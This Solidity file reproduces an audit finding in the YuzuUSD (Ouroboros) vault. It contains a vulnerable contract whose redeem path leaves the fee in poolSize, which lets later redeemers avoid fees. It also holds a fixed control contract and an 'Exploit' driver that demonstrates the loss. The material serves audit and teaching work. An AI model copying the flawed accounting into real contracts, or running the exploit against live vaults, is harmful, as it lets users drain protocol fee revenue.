// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of YuzuUSD (Ouroboros) finding 62758:
// "[H-03] Fee avoidance possible by uncollected fees in pool accounting".
//
// Real source: github.com/Telos-Consilium/ouroboros-contracts
//              commit 6dab29807b9e54d2b41cff9ffccbc63b8442d6a8 (audited/pre-fix)
//              src/YuzuILP.sol  +  src/proto/YuzuProto.sol  +  src/proto/YuzuIssuer.sol
//
// The synchronous redeem path computes the payout as the NET amount
// (gross value of the shares MINUS the redeem fee) and then, in
// YuzuILP._withdraw, subtracts ONLY that net payout from `poolSize`:
//
//     function _withdraw(...) internal override {
//         poolSize -= assets;                 // assets == NET payout
//         super._withdraw(caller, receiver, _owner, assets, shares);
//     }
//
// The full amount of shares is burned, but the fee portion of the
// redeemer's stake is NEVER removed from `poolSize` and never collected
// by the protocol. It stays as backing for the remaining shares, so the
// remaining holders' share price is inflated by exactly the escaped fee.
// The next redeemer therefore recovers a windfall and their EFFECTIVE fee
// shrinks toward zero -> fee avoidance / protocol fee under-collection.
//
// This reduces the SYNCHRONOUS YuzuILP._withdraw variant (redeemFeePpm /
// previewRedeem / _withdraw), avoiding the async order-book machinery of
// StakedYuzuUSD while reproducing the identical accounting bug.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful double for OpenZeppelin's Math (mulDiv + Rounding),
///      matching the exact rounding semantics the vulnerable code relies on.
///      All operands here are <= ~2e50, far below the 2^256 overflow bound, so
///      plain `x*y/denominator` yields the same result as OZ's 512-bit mulDiv.
library Math {
    enum Rounding {
        Floor, // 0 = toward negative infinity
        Ceil, //  1 = toward positive infinity
        Trunc, // 2 = toward zero
        Expand // 3 = away from zero
    }

    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256) {
        return x * y / denominator;
    }

    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {
        uint256 result = mulDiv(x, y, denominator);
        if (unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0) {
            result += 1;
        }
        return result;
    }

    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {
        return uint8(rounding) % 2 == 1;
    }
}

/// @dev Minimal ERC20 double for the opaque underlying collateral (yzUSD) and
///      for the harm MARKER token. Not the vulnerable boundary.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

interface IVault {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. The share/fee/poolSize math below is the verbatim
// arithmetic from YuzuILP.sol / YuzuProto.sol / YuzuIssuer.sol at the audited
// commit; the inheritance chain (ERC20Upgradeable / AccessControl / OrderBook)
// is flattened to a minimal share ledger, which does not touch the bug.
// ─────────────────────────────────────────────────────────────────────────────
contract YuzuILP is IVault {
    // --- minimal share ledger (stands in for ERC20Upgradeable) ---
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    // --- YuzuProto / YuzuILP storage relevant to the bug ---
    MiniToken public assetToken; // the collateral (yzUSD)
    uint256 public redeemFeePpm; // YuzuProto.redeemFeePpm
    uint256 public poolSize; // YuzuILP.poolSize

    constructor(MiniToken _asset, uint256 _redeemFeePpm) {
        assetToken = _asset;
        redeemFeePpm = _redeemFeePpm;
    }

    // YuzuProto._decimalsOffset()
    function _decimalsOffset() internal pure returns (uint8) {
        return 12;
    }

    // YuzuILP._totalAssets(): poolSize + yieldSinceUpdate; yield rate is 0 here.
    function _totalAssets(Math.Rounding) internal view returns (uint256) {
        return poolSize;
    }

    // ── verbatim YuzuILP._convertToSharesMinted ──
    function _convertToSharesMinted(uint256 assets, Math.Rounding rounding) internal view returns (uint256) {
        // slither-disable-next-line incorrect-equality
        if (poolSize == 0) {
            return assets * 10 ** _decimalsOffset();
        }
        uint256 totalAsset_ = _totalAssets(Math.Rounding(1 - uint256(rounding)));
        return Math.mulDiv(totalSupply, assets, totalAsset_, rounding);
    }

    // ── verbatim YuzuILP._convertToAssetsWithdrawn ──
    function _convertToAssetsWithdrawn(uint256 shares, Math.Rounding rounding) internal view returns (uint256) {
        // slither-disable-next-line incorrect-equality
        if (totalSupply == 0) {
            return 0;
        }
        return Math.mulDiv(poolSize, shares, totalSupply, rounding);
    }

    // ── verbatim YuzuProto._feeOnTotal ──
    function _feeOnTotal(uint256 assets, uint256 feePpm) internal pure returns (uint256) {
        return Math.mulDiv(assets, feePpm, feePpm + 1e6, Math.Rounding.Ceil);
    }

    // ── verbatim YuzuILP.previewRedeem ──
    function previewRedeem(uint256 shares) public view returns (uint256) {
        uint256 assets = _convertToAssetsWithdrawn(shares, Math.Rounding.Floor);
        uint256 fee = _feeOnTotal(assets, redeemFeePpm);
        return assets - fee;
    }

    // YuzuIssuer.deposit -> previewDeposit -> _deposit
    function deposit(uint256 assets, address receiver) public returns (uint256) {
        uint256 shares = _convertToSharesMinted(assets, Math.Rounding.Floor);
        _deposit(msg.sender, receiver, assets, shares);
        return shares;
    }

    // YuzuILP._deposit (yield 0 -> _discountYield(assets) == assets), then
    // YuzuIssuer._deposit body (pull collateral, mint shares).
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal {
        poolSize += assets;
        assetToken.transferFrom(caller, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }

    // YuzuIssuer.redeem: assets = previewRedeem(tokens) is the NET payout.
    function redeem(uint256 shares, address receiver, address owner) public returns (uint256) {
        uint256 assets = previewRedeem(shares);
        _withdraw(msg.sender, receiver, owner, assets, shares);
        return assets;
    }

    // ── verbatim YuzuILP._withdraw (the bug) followed by the flattened
    //    YuzuIssuer._withdraw body (burn shares, pay out the net `assets`). ──
    function _withdraw(address, address receiver, address owner, uint256 assets, uint256 shares) internal {
        poolSize -= assets; // @> BUG: only the NET payout leaves poolSize; the redeem fee stays in the pool and inflates share price for remaining holders
        // super._withdraw: burn the FULL share amount, transfer the NET assets out
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        assetToken.transfer(receiver, assets);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (negative control): the full GROSS value is removed from
// poolSize on redeem and the fee is transferred out to the protocol treasury,
// so share price stays flat and every redeemer pays the full, equal fee.
// ─────────────────────────────────────────────────────────────────────────────
contract YuzuILPFixed is IVault {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    MiniToken public assetToken;
    uint256 public redeemFeePpm;
    uint256 public poolSize;
    address public feeTreasury;

    constructor(MiniToken _asset, uint256 _redeemFeePpm, address _feeTreasury) {
        assetToken = _asset;
        redeemFeePpm = _redeemFeePpm;
        feeTreasury = _feeTreasury;
    }

    function _decimalsOffset() internal pure returns (uint8) {
        return 12;
    }

    function _totalAssets(Math.Rounding) internal view returns (uint256) {
        return poolSize;
    }

    function _convertToSharesMinted(uint256 assets, Math.Rounding rounding) internal view returns (uint256) {
        if (poolSize == 0) {
            return assets * 10 ** _decimalsOffset();
        }
        uint256 totalAsset_ = _totalAssets(Math.Rounding(1 - uint256(rounding)));
        return Math.mulDiv(totalSupply, assets, totalAsset_, rounding);
    }

    function _convertToAssetsWithdrawn(uint256 shares, Math.Rounding rounding) internal view returns (uint256) {
        if (totalSupply == 0) {
            return 0;
        }
        return Math.mulDiv(poolSize, shares, totalSupply, rounding);
    }

    function _feeOnTotal(uint256 assets, uint256 feePpm) internal pure returns (uint256) {
        return Math.mulDiv(assets, feePpm, feePpm + 1e6, Math.Rounding.Ceil);
    }

    function deposit(uint256 assets, address receiver) public returns (uint256) {
        uint256 shares = _convertToSharesMinted(assets, Math.Rounding.Floor);
        poolSize += assets;
        assetToken.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
        return shares;
    }

    function redeem(uint256 shares, address receiver, address owner) public returns (uint256) {
        uint256 gross = _convertToAssetsWithdrawn(shares, Math.Rounding.Floor);
        uint256 fee = _feeOnTotal(gross, redeemFeePpm);
        uint256 assets = gross - fee;

        poolSize -= gross; // FIX: remove the FULL gross (incl. fee) from the pool
        balanceOf[owner] -= shares;
        totalSupply -= shares;

        assetToken.transfer(receiver, assets);
        assetToken.transfer(feeTreasury, fee); // FIX: fee collected by the protocol
        return assets;
    }
}

/// @dev A minimal user account so caller == owner on every deposit/redeem
///      (natural allowance semantics) and per-user share balances stay clean.
contract User {
    function doDeposit(IVault vault, MiniToken token, uint256 assets) external returns (uint256) {
        token.approve(address(vault), assets);
        return vault.deposit(assets, address(this));
    }

    function doRedeem(IVault vault, uint256 shares) external returns (uint256) {
        return vault.redeem(shares, address(this), address(this));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: two users each deposit 100 yzUSD, then fully redeem in
// sequence at a 10% redeem fee. Because user A's fee is left in poolSize, user
// B recovers a windfall and pays a near-zero effective fee. The escaped fee
// (B's windfall over A) is recorded on a MARKER token minted to the SINK.
// A negative control replays the same scenario against the FIXED vault.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant FIXED_TREASURY = 0x00000000000000000000000000000000fEE00001;

    uint256 internal constant DEPOSIT = 100 ether; // 100 yzUSD each
    uint256 internal constant REDEEM_FEE_PPM = 100_000; // fee == 10% of the net payout

    MiniToken public asset;
    YuzuILP public buggyVault;
    YuzuILPFixed public fixedVault;
    User public userA;
    User public userB;
    MiniToken public marker;

    // Exposed results for the driver.
    uint256 public buggyNetA;
    uint256 public buggyNetB;
    uint256 public escapedFees;
    uint256 public sinkMarkerBalance;
    uint256 public buggyVaultLeftover;
    uint256 public fixedNetA;
    uint256 public fixedNetB;
    uint256 public fixedTreasuryBalance;

    address public vaultAddr;
    address public fixedVaultAddr;
    address public markerAddr;

    constructor() {
        asset = new MiniToken("Yuzu USD", "yzUSD"); // deploy 0
        buggyVault = new YuzuILP(asset, REDEEM_FEE_PPM); // deploy 1
        fixedVault = new YuzuILPFixed(asset, REDEEM_FEE_PPM, FIXED_TREASURY); // deploy 2
        userA = new User(); // deploy 3
        userB = new User(); // deploy 4
        marker = new MiniToken("Escaped Redeem Fees", "LOST-YZUSD"); // deploy 5 (LAST)

        vaultAddr = address(buggyVault);
        fixedVaultAddr = address(fixedVault);
        markerAddr = address(marker);
    }

    function run() external payable {
        // ============ REAL BUGGY PATH ============
        asset.mint(address(userA), DEPOSIT);
        asset.mint(address(userB), DEPOSIT);

        uint256 sharesA = userA.doDeposit(buggyVault, asset, DEPOSIT);
        uint256 sharesB = userB.doDeposit(buggyVault, asset, DEPOSIT);

        // Redeem in sequence. A's fee is left in poolSize -> B's shares inflate.
        buggyNetA = userA.doRedeem(buggyVault, sharesA);
        buggyNetB = userB.doRedeem(buggyVault, sharesB);

        // Fee that escaped the protocol: B's windfall over A for an identical
        // deposit and identical nominal fee (== fixed-treasury shortfall).
        escapedFees = buggyNetB - buggyNetA;
        buggyVaultLeftover = asset.balanceOf(address(buggyVault));

        // Record the harm magnitude on the marker at the SINK.
        marker.mint(SINK, escapedFees);
        sinkMarkerBalance = marker.balanceOf(SINK);

        // ============ NEGATIVE CONTROL: FIXED VAULT ============
        asset.mint(address(userA), DEPOSIT);
        asset.mint(address(userB), DEPOSIT);

        uint256 fSharesA = userA.doDeposit(fixedVault, asset, DEPOSIT);
        uint256 fSharesB = userB.doDeposit(fixedVault, asset, DEPOSIT);

        fixedNetA = userA.doRedeem(fixedVault, fSharesA);
        fixedNetB = userB.doRedeem(fixedVault, fSharesB);
        fixedTreasuryBalance = asset.balanceOf(FIXED_TREASURY);

        // Harm holds: the second redeemer strictly out-earns the first for an
        // identical position, and the fixed control removes the asymmetry.
        require(buggyNetB > buggyNetA, "no fee avoidance");
        require(escapedFees > 0, "no escaped fees");
        require(fixedNetA == fixedNetB, "control not symmetric");
    }
}
